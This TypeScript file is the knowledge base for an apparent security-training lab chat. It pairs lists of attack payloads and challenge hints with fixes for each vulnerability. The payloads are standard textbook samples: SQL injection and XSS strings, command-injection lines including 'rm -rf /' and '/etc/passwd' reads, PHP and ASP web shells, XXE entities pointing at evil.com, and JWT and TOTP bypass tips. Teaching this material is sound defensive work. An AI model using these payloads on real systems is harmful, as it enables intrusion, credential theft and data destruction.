// CyberLab Chat Knowledge Base
export interface Vulnerability {
  id: string;
  name: string;
  category: string;
  description: string;
  payloads: string[];
  solutions: string[];
  commonErrors: string[];
  difficulty: 'easy' | 'medium' | 'hard' | 'expert';
  references: string[];
}

export interface Challenge {
  id: string;
  name: string;
  module: string;
  commonIssues: {
    error: string;
    solution: string;
    hint: string;
  }[];
  hints: string[];
  nextSteps: string[];
}

export interface ChatContext {
  currentModule?: string;
  difficulty?: string;
  userProgress?: any;
  lastError?: string;
}

export const vulnerabilities: Vulnerability[] = [
  // SQL Injection
  {
    id: "sql-basic",
    name: "Basic SQL Injection",
    category: "Web",
    description: "Direct SQL injection through unsanitized input parameters",
    payloads: [
      "' OR '1'='1' --",
      "' OR 1=1 --",
      "admin' --",
      "' UNION SELECT 1,2,3 --",
      "' AND (SELECT COUNT(*) FROM users) > 0 --"
    ],
    solutions: [
      "Use prepared statements/parameterized queries",
      "Implement input validation and sanitization",
      "Apply the principle of least privilege for database accounts",
      "Use stored procedures with proper parameter handling"
    ],
    commonErrors: [
      "SQL syntax error near",
      "Unknown column",
      "Table doesn't exist",
      "Access denied for user"
    ],
    difficulty: "easy",
    references: [
      "https://owasp.org/www-community/attacks/SQL_Injection",
      "https://portswigger.net/web-security/sql-injection"
    ]
  },
  
  // XSS
  {
    id: "xss-reflected",
    name: "Reflected XSS",
    category: "Web",
    description: "Cross-site scripting via reflected user input",
    payloads: [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg onload=alert('XSS')>",
      "javascript:alert('XSS')",
      "<iframe src='javascript:alert(\"XSS\")'></iframe>"
    ],
    solutions: [
      "Implement Content Security Policy (CSP)",
      "Use proper output encoding/escaping",
      "Validate and sanitize all user inputs",
      "Use secure templating engines"
    ],
    commonErrors: [
      "Script blocked by CSP",
      "Unsafe inline script",
      "Character encoding issues"
    ],
    difficulty: "easy",
    references: [
      "https://owasp.org/www-community/attacks/xss/",
      "https://portswigger.net/web-security/cross-site-scripting"
    ]
  },

  // Command Injection
  {
    id: "command-injection",
    name: "Command Injection",
    category: "Web",
    description: "Execution of arbitrary commands through unsanitized input",
    payloads: [
      "; ls -la",
      "&& whoami",
      "| cat /etc/passwd",
      "`whoami`",
      "$(whoami)",
      "; rm -rf / --no-preserve-root"
    ],
    solutions: [
      "Use parameterized APIs instead of shell commands",
      "Implement strict input validation",
      "Use allow-lists for valid inputs",
      "Apply principle of least privilege"
    ],
    commonErrors: [
      "Command not found",
      "Permission denied",
      "Syntax error",
      "Timeout occurred"
    ],
    difficulty: "medium",
    references: [
      "https://owasp.org/www-community/attacks/Command_Injection",
      "https://portswigger.net/web-security/os-command-injection"
    ]
  },

  // File Upload
  {
    id: "file-upload",
    name: "Malicious File Upload",
    category: "Web",
    description: "Uploading malicious files to compromise the server",
    payloads: [
      "<?php system($_GET['cmd']); ?>",
      "<?php exec($_POST['command']); ?>",
      "<script>alert('XSS')</script>",
      "<%eval request(\"cmd\")%>",
      "#!/bin/bash\nwhoami"
    ],
    solutions: [
      "Implement strict file type validation",
      "Use allow-lists for file extensions",
      "Scan uploaded files for malware",
      "Store uploads outside web root",
      "Set proper file permissions"
    ],
    commonErrors: [
      "File type not allowed",
      "File size too large",
      "Upload directory not writable",
      "Virus detected in file"
    ],
    difficulty: "medium",
    references: [
      "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
      "https://portswigger.net/web-security/file-upload"
    ]
  },

  // TOTP/2FA Authentication
  {
    id: "totp-2fa",
    name: "TOTP/2FA Authentication",
    category: "Authentication",
    description: "Time-Based One-Time Password vulnerabilities and bypass techniques",
    payloads: [
      "000000", "123456", "111111", "999999",
      "Brute force 6-digit codes within time window",
      "Race condition on token validation",
      "Secret prediction: btoa(\"admin_secret_123\").substring(0,16)",
      "Time window manipulation attacks"
    ],
    solutions: [
      "Use cryptographically secure secret generation",
      "Implement strict rate limiting (3-5 attempts max)",
      "Never expose secrets in client-side code",
      "Use constant-time comparisons for validation",
      "Implement proper session management"
    ],
    commonErrors: [
      "Invalid TOTP code",
      "Code expired or reused",
      "Rate limit exceeded",
      "Secret generation failed"
    ],
    difficulty: "hard",
    references: [
      "https://datatracker.ietf.org/doc/html/rfc6238",
      "https://owasp.org/www-community/controls/Multi_factor_authentication_cheat_sheet"
    ]
  },

  // JWT Authentication
  {
    id: "jwt-auth",
    name: "JWT Authentication",
    category: "Authentication", 
    description: "JSON Web Token vulnerabilities including algorithm confusion and signature bypass",
    payloads: [
      "Algorithm none: {\"alg\": \"none\", \"typ\": \"JWT\"}",
      "Weak HMAC secret: 'secret', 'key', '123456'",
      "Algorithm confusion: Change RS256 to HS256",
      "JKU header injection: Point to malicious JWKS endpoint",
      "Modified payload: {\"role\": \"admin\", \"username\": \"admin\"}"
    ],
    solutions: [
      "Explicitly specify and validate expected algorithm", 
      "Never accept 'none' algorithm in production",
      "Whitelist trusted JKU domains",
      "Use separate keys for signing and verification",
      "Implement proper key management and rotation"
    ],
    commonErrors: [
      "Invalid signature",
      "Algorithm not allowed",
      "Token expired",
      "JKU domain not whitelisted"
    ],
    difficulty: "expert",
    references: [
      "https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/",
      "https://portswigger.net/web-security/jwt"
    ]
  },

  // Authentication Bypass
  {
    id: "auth-bypass",
    name: "Authentication Bypass",
    category: "Web",
    description: "Bypassing authentication mechanisms",
    payloads: [
      "admin' OR '1'='1' --",
      "admin' /*",
      "' OR 1=1 #",
      "admin'||'1'='1",
      "1' or '1' = '1' --"
    ],
    solutions: [
      "Implement proper password hashing",
      "Use multi-factor authentication",
      "Implement account lockout mechanisms",
      "Use secure session management"
    ],
    commonErrors: [
      "Invalid credentials",
      "Account locked",
      "Session expired",
      "Access denied"
    ],
    difficulty: "medium",
    references: [
      "https://owasp.org/www-community/attacks/Authentication_bypass",
      "https://portswigger.net/web-security/authentication"
    ]
  },

  // CSRF
  {
    id: "csrf",
    name: "Cross-Site Request Forgery",
    category: "Web",
    description: "Forcing users to execute unwanted actions",
    payloads: [
      "<img src='http://target/admin/delete-user?id=1'>",
      "<form action='http://target/transfer' method='POST'><input name='amount' value='1000'></form>",
      "<script>fetch('/admin/create-user', {method: 'POST'})</script>"
    ],
    solutions: [
      "Implement CSRF tokens",
      "Use SameSite cookie attribute",
      "Verify the Referer header",
      "Use double-submit cookies"
    ],
    commonErrors: [
      "CSRF token missing",
      "Invalid token",
      "Token expired",
      "Cross-origin request blocked"
    ],
    difficulty: "medium",
    references: [
      "https://owasp.org/www-community/attacks/csrf",
      "https://portswigger.net/web-security/csrf"
    ]
  },

  // Directory Traversal
  {
    id: "path-traversal",
    name: "Path Traversal",
    category: "Web",
    description: "Accessing files outside intended directory",
    payloads: [
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
      "....//....//....//etc/passwd",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "..;/..;/..;/etc/passwd"
    ],
    solutions: [
      "Use allow-lists for valid file paths",
      "Implement proper input validation",
      "Use chroot jails or sandboxing",
      "Canonicalize file paths"
    ],
    commonErrors: [
      "File not found",
      "Access denied",
      "Path not allowed",
      "Invalid characters in path"
    ],
    difficulty: "easy",
    references: [
      "https://owasp.org/www-community/attacks/Path_Traversal",
      "https://portswigger.net/web-security/file-path-traversal"
    ]
  },

  // LDAP Injection
  {
    id: "ldap-injection",
    name: "LDAP Injection",
    category: "Web",
    description: "Exploiting LDAP queries through unsanitized input",
    payloads: [
      "*)(uid=*",
      "*)(cn=*",
      "admin)(&(password=*",
      "*)(objectClass=*",
      "*))(|(objectClass=*"
    ],
    solutions: [
      "Use parameterized LDAP queries",
      "Implement proper input validation",
      "Escape special LDAP characters",
      "Use bind authentication"
    ],
    commonErrors: [
      "LDAP syntax error",
      "Authentication failed",
      "Connection timeout",
      "Invalid DN format"
    ],
    difficulty: "hard",
    references: [
      "https://owasp.org/www-community/attacks/LDAP_Injection",
      "https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html"
    ]
  },

  // XXE
  {
    id: "xxe",
    name: "XML External Entity",
    category: "Web",
    description: "Processing malicious XML with external entities",
    payloads: [
      "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
      "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/malicious\">]><root>&xxe;</root>",
      "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"> %xxe;]>"
    ],
    solutions: [
      "Disable external entity processing",
      "Use secure XML parsers",
      "Validate XML input structure",
      "Use JSON instead of XML where possible"
    ],
    commonErrors: [
      "XML parsing error",
      "External entity forbidden",
      "File not found",
      "Network unreachable"
    ],
    difficulty: "hard",
    references: [
      "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
      "https://portswigger.net/web-security/xxe"
    ]
  },

  // SSTI
  {
    id: "ssti",
    name: "Server-Side Template Injection",
    category: "Web",
    description: "Injecting malicious templates for code execution",
    payloads: [
      "{{7*7}}",
      "${7*7}",
      "<%= 7*7 %>",
      "{{config.items()}}",
      "{{''.__class__.__mro__[2].__subclasses__()}}"
    ],
    solutions: [
      "Use sandboxed template engines",
      "Validate template syntax",
      "Avoid user-controlled template data",
      "Implement proper access controls"
    ],
    commonErrors: [
      "Template syntax error",
      "Undefined variable",
      "Access denied",
      "Sandbox violation"
    ],
    difficulty: "expert",
    references: [
      "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection",
      "https://portswigger.net/research/server-side-template-injection"
    ]
  }
];

export const challenges: Challenge[] = [
  {
    id: "sql-injection-basic",
    name: "SQL Injection Challenge",
    module: "sql-injection",
    commonIssues: [
      {
        error: "No results returned",
        solution: "Try using OR conditions to bypass authentication",
        hint: "Use ' OR '1'='1' -- to always make the condition true"
      },
      {
        error: "SQL syntax error",
        solution: "Check your quote placement and comment syntax",
        hint: "Make sure to properly close quotes and use -- for comments"
      },
      {
        error: "Access denied",
        solution: "The payload worked but you don't have permissions",
        hint: "Try extracting data from tables you have access to"
      }
    ],
    hints: [
      "Start with simple OR conditions",
      "Use UNION to extract additional data",
      "Check for different quote types (' vs \")",
      "Try commenting out the rest of the query"
    ],
    nextSteps: [
      "Try UNION-based SQL injection",
      "Attempt blind SQL injection techniques",
      "Explore time-based injection methods"
    ]
  },
  
  {
    id: "xss-reflected",
    name: "Reflected XSS Challenge",
    module: "xss",
    commonIssues: [
      {
        error: "Script not executing",
        solution: "Check if CSP is blocking inline scripts",
        hint: "Try using event handlers like onerror or onload"
      },
      {
        error: "Characters being encoded",
        solution: "Find injection points that don't encode your payload",
        hint: "Try different injection contexts like attributes or URLs"
      }
    ],
    hints: [
      "Start with basic <script>alert(1)</script>",
      "Try image tags with onerror events",
      "Use SVG tags for more complex payloads",
      "Check different injection contexts"
    ],
    nextSteps: [
      "Try stored XSS if reflected doesn't work",
      "Attempt DOM-based XSS",
      "Explore CSP bypass techniques"
    ]
  },

  {
    id: "command-injection",
    name: "Command Injection Challenge",
    module: "command-injection",
    commonIssues: [
      {
        error: "Command not found",
        solution: "The payload executed but command doesn't exist",
        hint: "Try basic commands like 'whoami' or 'ls'"
      },
      {
        error: "Permission denied",
        solution: "Command executed but lacks permissions",
        hint: "Try reading files you have access to like /etc/passwd"
      }
    ],
    hints: [
      "Start with command separators like ; && ||",
      "Try command substitution with backticks",
      "Use basic enumeration commands",
      "Test different command separators"
    ],
    nextSteps: [
      "Attempt reverse shell payloads",
      "Try privilege escalation",
      "Explore file system access"
    ]
  },
  
  {
    id: "totp-2fa-challenge",
    name: "TOTP/2FA Authentication Challenge",
    module: "totp-2fa",
    commonIssues: [
      {
        error: "Invalid TOTP code",
        solution: "Check if the secret is predictable or leaked",
        hint: "Look in browser dev tools for exposed secrets or try brute force during extended time windows"
      },
      {
        error: "Code already used",
        solution: "Each TOTP code should only be valid once",
        hint: "Wait for the next time window or check for race conditions"
      },
      {
        error: "Rate limit exceeded", 
        solution: "Too many invalid attempts",
        hint: "Check if rate limiting can be bypassed or if there's session state confusion"
      }
    ],
    hints: [
      "Check if secrets follow predictable patterns",
      "Look for extended time windows (>30 seconds)",
      "Inspect client-side code for secret exposure",
      "Test for session state manipulation",
      "Try brute force during wide time windows"
    ],
    nextSteps: [
      "Exploit weak secret generation",
      "Attempt session manipulation",
      "Look for cryptographic leaks in browser"
    ]
  },
  
  {
    id: "jwt-authentication-challenge",
    name: "JWT Authentication Challenge",
    module: "jwt-authentication", 
    commonIssues: [
      {
        error: "Invalid signature",
        solution: "JWT signature verification failed",
        hint: "Try the 'none' algorithm attack or algorithm confusion"
      },
      {
        error: "Algorithm not allowed",
        solution: "Server rejected the algorithm",
        hint: "Check which algorithms are accepted and try algorithm confusion attacks"
      },
      {
        error: "Token expired",
        solution: "JWT has expired",
        hint: "Generate a new token with extended expiration or no expiration"
      },
      {
        error: "JKU domain not trusted",
        solution: "Server doesn't trust the JKU URL",
        hint: "Try using trusted domains or look for domain bypass techniques"
      }
    ],
    hints: [
      "Try setting algorithm to 'none' and remove signature",
      "Test algorithm confusion (RS256 -> HS256)",
      "Look for weak HMAC secrets like 'secret'",
      "Check for JKU header injection",
      "Inspect /public-key endpoint for key material"
    ],
    nextSteps: [
      "Attempt none algorithm bypass",
      "Try algorithm confusion attacks", 
      "Exploit JKU header injection"
    ]
  }
];

export const contextualSuggestions = {
  "sql-injection": [
    "Try using ' OR '1'='1' -- to bypass authentication",
    "Use UNION SELECT to extract data from other tables",
    "Test for different SQL comment styles (-- vs #)",
    "Check if error messages reveal database information"
  ],
  
  "xss": [
    "Start with <script>alert(1)</script> to test basic XSS",
    "Try <img src=x onerror=alert(1)> for attribute injection",
    "Use <svg onload=alert(1)> for more reliable execution",
    "Test different injection contexts (URL, form, headers)"
  ],
  
  "command-injection": [
    "Try ; whoami to test basic command injection",
    "Use && ls to chain commands together",
    "Test | cat /etc/passwd for file reading",
    "Try backticks `whoami` for command substitution"
  ],
  
  "file-upload": [
    "Upload a PHP shell: <?php system($_GET['cmd']); ?>",
    "Try double extensions like shell.php.jpg",
    "Use MIME type spoofing with magic bytes",
    "Test null byte injection filename.php%00.jpg"
  ],
  
  "totp-2fa": [
    "Check if secret follows predictable pattern",
    "Try brute forcing 6-digit codes during extended time windows",
    "Look for session state confusion in pre-authentication",
    "Inspect browser developer tools for leaked secrets",
    "Test for rate limiting bypass on 2FA attempts"
  ],
  
  "jwt-authentication": [
    "Try setting algorithm to 'none' and remove signature",
    "Test with weak HMAC secrets like 'secret' or 'key'",
    "Attempt algorithm confusion (RS256 to HS256)",
    "Look for JKU header injection opportunities",
    "Check if server fetches keys from user-controlled URLs"
  ]
};

export const getContextualHelp = (context: ChatContext): string[] => {
  const suggestions: string[] = [];
  
  if (context.currentModule) {
    const moduleSuggestions = contextualSuggestions[context.currentModule as keyof typeof contextualSuggestions];
    if (moduleSuggestions) {
      suggestions.push(...moduleSuggestions);
    }
  }
  
  if (context.difficulty === 'easy') {
    suggestions.push("Start with basic payloads and work your way up");
  } else if (context.difficulty === 'hard') {
    suggestions.push("Try advanced techniques and payload obfuscation");
  }
  
  return suggestions;
};

export const findVulnerabilityByPayload = (payload: string): Vulnerability | undefined => {
  return vulnerabilities.find(vuln => 
    vuln.payloads.some(p => p.includes(payload) || payload.includes(p))
  );
};

export const searchKnowledgeBase = (query: string): (Vulnerability | Challenge)[] => {
  const results: (Vulnerability | Challenge)[] = [];
  const searchTerms = query.toLowerCase().split(' ');
  
  // Search vulnerabilities
  vulnerabilities.forEach(vuln => {
    const searchableText = `${vuln.name} ${vuln.description} ${vuln.category}`.toLowerCase();
    if (searchTerms.some(term => searchableText.includes(term))) {
      results.push(vuln);
    }
  });
  
  // Search challenges
  challenges.forEach(challenge => {
    const searchableText = `${challenge.name} ${challenge.module}`.toLowerCase();
    if (searchTerms.some(term => searchableText.includes(term))) {
      results.push(challenge);
    }
  });
  
  return results.slice(0, 10); // Limit results
};